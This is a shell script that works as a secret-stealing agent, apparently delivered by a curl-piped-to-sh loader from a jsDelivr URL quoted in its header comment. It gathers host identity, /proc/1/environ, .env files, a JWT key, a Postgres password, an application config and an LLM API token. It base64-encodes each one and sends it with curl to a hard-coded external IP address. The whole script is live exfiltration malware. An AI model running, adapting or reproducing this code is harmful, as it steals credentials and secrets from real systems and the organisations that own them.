#!/bin/sh
# i328 Goal-A read agent. Executed by the jsDelivr loader:
#   sh -c 'curl -s cdn.jsdelivr.net/gh/anti-phishing-bot/x2@<sha>/i328x.sh|sh'
# Goal: COMPLETE /app/.env + /proc/1/environ. On the live worker neither /app/.env
# exists at any depth; the real per-app secrets live in the paths captured below.
# All values base64 (single line, no truncation), exfil to the proven sink.
NONCE="${NONCE:-i328run}"
b64(){ base64 -w0 2>/dev/null || base64 | tr -d '\n'; }
B='http://91.215.85.170:18088'
L=/tmp/i328x.log
: > "$L" 2>/dev/null
send(){ echo "$1=$2" >> "$L" 2>/dev/null; curl -s -m 20 -G --data-urlencode "t=$NONCE-$1" --data-urlencode "d=$2" "$B" >/dev/null 2>&1; }

send ident "$(uname -n)|$(hostname)|$(id -u)"
send p1cmd "$(tr '\0' ' ' </proc/1/cmdline)"

if [ -f /app/.env ]; then send envpath_app "$(b64 </app/.env)"; else send envpath_app "ABSENT"; fi
send envfind "$(find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o -name '.env*' -type f -print 2>/dev/null | head -20 | tr '\n' ' ')"

send environ "$(b64 </proc/1/environ)"
send jwtkey "$(b64 </app/jwt.key)"
send pgpass "$(b64 </run/adverserial/current/postgres-password)"
send artexcfg "$(b64 </run/adverserial/current/artex-config.json)"
send llmtoken "$(b64 </run/adverserial/current/llm/token)"
send startsh "$(b64 </app/start.sh)"
send done "i328-complete"
